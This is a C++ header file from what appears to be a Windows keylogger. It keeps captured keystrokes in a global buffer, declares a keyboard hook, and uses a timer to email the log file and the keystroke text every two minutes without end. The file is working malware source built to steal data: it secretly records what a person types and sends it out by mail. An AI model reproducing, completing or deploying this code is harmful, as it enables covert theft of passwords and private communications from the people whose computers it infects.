#pragma once
#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string keylog = "";

void TimerSendMail()
{
	if (keylog.empty())
		return;
	std::string last_file = IO::WriteLog(keylog);

	if (last_file.empty())
	{
		Helper::WriteAppLog("File creation was not succesfull. Keylog'" + keylog + "'");
		return;
	}

	int x = Mail::SendMail("Log [" + last_file + "]",
						   "Hi :) \nThe file has been attached to this mail :)\nFor testing, enjoy:)\n" + keylog,
		                    IO::GetOurPath(true) + last_file);
	if (x != 7)
		Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
	else
		keylog = "";
}

Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);

HHOOK eHook = NULL;



#endif